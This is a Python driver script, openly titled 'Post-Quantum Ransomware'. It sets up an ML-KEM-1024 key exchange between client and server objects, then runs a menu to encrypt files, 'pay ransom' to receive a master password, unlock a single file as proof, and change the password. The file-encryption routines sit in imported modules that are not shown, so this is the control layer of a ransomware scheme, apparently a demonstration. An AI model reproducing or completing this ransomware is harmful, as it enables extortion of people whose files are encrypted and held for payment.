from client import Client
from server import Server
from pqcrypto.kem.ml_kem_1024 import generate_keypair as generate_kem_keypair


def main():
    print("=== Post-Quantum Ransomware ===\n")

    kem_public_key, kem_secret_key = generate_kem_keypair()
    client = Client(kem_public_key)
    server = Server(kem_secret_key)
    ciphertext, plaintext_original = client.establish_shared_secret()
    plaintext_recovered = server.establish_shared_secret(ciphertext)

    if plaintext_original == plaintext_recovered:
        print("Shared secret established successfully between client and server.\n")
        client.derive_shared_secret(plaintext_original)
        server.derive_shared_secret(plaintext_original)
    else:
        print("Failed to establish shared secret between client and server.\n")

    while True:

        print("1. Encrypt files")
        print("2. Pay ransom")
        print("3. Unlock one file")
        print("4. Change password")

        selection = input("\nSelect an option (1-4): ")

        if selection == "1":
            data_iv, data_ciphertext, data_tag = client.encrypt_files()
            server.get_client_passwords(data_iv, data_ciphertext, data_tag)
            print("The files have been encrypted.\n")
        elif selection == "2":
            data_iv, data_ciphertext, data_tag = server.send_master_password()
            client.decrypt_files(data_iv, data_ciphertext, data_tag)
            server.remove_client_passwords()
            print("All files have been decrypted.\n")
        elif selection == "3":
            file_path = input("Enter the path of the file to unlock: ")
            data_iv, data_ciphertext, data_tag = client.get_file_id(file_path)
            data_iv, data_ciphertext, data_tag = server.send_password(
                data_iv, data_ciphertext, data_tag
            )
            client.decrypt_file_with_password(
                file_path, data_iv, data_ciphertext, data_tag
            )
            print(f"The file '{file_path}' has been decrypted.\n")
        elif selection == "4":
            data_iv, data_ciphertext, data_tag = client.get_master_password_data()
            data_iv, data_ciphertext, data_tag = server.change_master_password(
                data_iv, data_ciphertext, data_tag
            )
            client.change_master_password_data(data_iv, data_ciphertext, data_tag)
            print("The master password has been changed.\n")
        else:
            print("Invalid selection. Please choose a valid option.")


if __name__ == "__main__":
    main()
